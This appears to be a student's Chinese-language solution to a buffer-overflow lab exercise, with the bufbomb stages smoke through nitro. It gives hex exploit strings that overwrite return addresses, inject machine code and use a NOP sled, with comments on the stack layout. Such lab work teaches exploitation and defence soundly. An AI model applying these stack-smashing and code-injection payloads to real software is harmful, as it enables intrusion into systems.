第一阶段：smoke
//开头的40个字节为buf中的内容（程序中buf大小就定义了40个字节）
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
//这里是原ebp被压栈的地方
00 00 00 00 
//这里是原返回地址被压栈的地方，改写为smoke的入口地址
90 8c 04 08

第二阶段：fizz
//开头40个字节同第一阶段
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
//这里是原ebp被压栈的地方
00 00 00 00 
//这里是原返回地址被压栈的地方，改写为fizz的入口地址
ba 8c 04 08
//fizz函数的参数应为0x46815ca5，存储的位置是根据fizz函数中的反汇编代码决定的
00 00 00 00 a5 5c 81 46

//第三阶段：bang
/* 
    解题思路：我们要改写gloabl_value的值，让它和我们的cookie相等，但这个操作必须通过相应的汇编指令才能实现，但是我们的输入只能是一个字符串，那么我们就需要将相应的汇编指令译成对应的机器指令后放入这个字符串中，假设我们在这个字符串的一开始（也即从buf的首地址开始）就存入相应的机器指令，那么我们在输入的第41~44个字节（见前两阶段，这四个字节代表了getbuf这个函数的返回地址）就应该输入buf的首地址，这样在getbuf执行ret之后，就会开始执行我们事先准备好的那一部分机器指令，也就达到了改变global_value值的效果。
    但是以上，仅仅实现了修改global_value值的操作，我们还需要让程序转向bang函数，这可以通过push bang函数入口地址，紧接着ret返回来实现。
    综上，我们共需编写两个功能的汇编语句（作为一个攻击程序），翻译成机器指令后以字符串形式存入buf。
*/
//实现对应功能的机器指令
c7 05 18 c2 04 08 a5 5c 81 46 68 05 8d 04 08 c3
//用0补全剩下的buf数组
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
//这里是原ebp被压栈的地方
00 00 00 00
//这里是原返回地址被压栈的地方，改写为buf的首地址（即我们的攻击程序的入口地址）
38 35 68 55

//第四阶段：boom
/*
    解题思路：和第三阶段大致相同，在输入的字符串中嵌入机器指令，在原本getbuf函数返回地址的地方改写成buf的入口地址，执行完修改eax的指令后，要把test函数中getbuf的下一句指令的地址push，然后ret，这样能够使得在执行完攻击程序之后再回到test函数。
    注意：在前面几关中均修改了ebp的值，而这题我们应该保证ebp的值还是正常的，故在getbuf函数设置断点，一路运行到这一句，然后使用x/x $ebp来查看ebp本来应该有的值，在输入字符串时要保证这里不变。
    PS：leave指令的功能等价于：movl %ebp, %esp		popl %ebp
*/
//实现对应功能的机器指令（修改eax的值为cookie，并返回test函数）
b8 a5 5c 81 46 68 81 8e 04 08 c3
//用0补全剩下的buf数组
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
//这里是原ebp被压栈的地方（本题要保持ebp还是输入buf之前的数据）
90 35 68 55
//这里是原返回地址被压栈的地方，改写为buf的首地址（即我们的攻击程序的入口地址）
38 35 68 55

//第五阶段：nitro
/*
解题思路：首先，启动程序后，testn和getbufn会循环进行五次调用，这五次调用中ebp的值各不相同，但如果重复启动程序的话，这5个数是固定的；
        那么，这题本质上和第三、四阶段差不多，要改写调用getbufn结束后的返回地址（为buf的入口地址，但这题该入口地址是不确定的），并在输入的字符串中加入机器指令编写的攻击程序（应实现功能：改变eax的值，恢复ebp的值，将testn断点地址压栈并返回使得程序正常进行）
        由于每一次buf入口地址不确定，因此机器指令不能像前两个阶段一样放在字符串的开头，而应该紧贴着改写的返回地址放入，在getbufn结束并返回buf的入口地址后，使用空转指令nop（机器指令90）来跳过攻击程序之前的部分
        通过观察本题的反汇编代码，指令地址804920d处，可以看出本题一共需要输入0x208 + 4（原存入ebp的地方） + 4（原返回地址） = 528（十进制）个字符，故本题的字符就是：若干个nop指令（机器指令90）+ 攻击程序的机器指令 + 改写的返回地址
        那么该由什么作为改写的返回地址呢？前面说到五次调用中ebp的5个值是固定的，因此ebp - 0x208也是5个固定的数（即5个不同的buf入口地址），取最大的那个作为改写的返回地址（因为这样，如果某一次调用时buf入口地址比这个小，返回的地方一定是空转指令nop，经过若干空转指令就可以到达攻击程序，想不出来画图）即可。
        还有一个问题，攻击程序中如何恢复ebp的地址，参考github上那一份实验报告
*/
//buf + 原ebp存放的4个字节
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  /* 到此行末尾是500个字符 */
90 90 90 90 90 90 90 90 90 b8 a5 5c 81 46 8d 6c 24 28 68 15  /* 到此行末尾是520个字符 */
8e 04 08 c3	/* 攻击程序的机器指令放在了上述字符中 */
//这里是原返回地址被压栈的地方，改写为五次调用中最大的buf首地址
88 33 68 55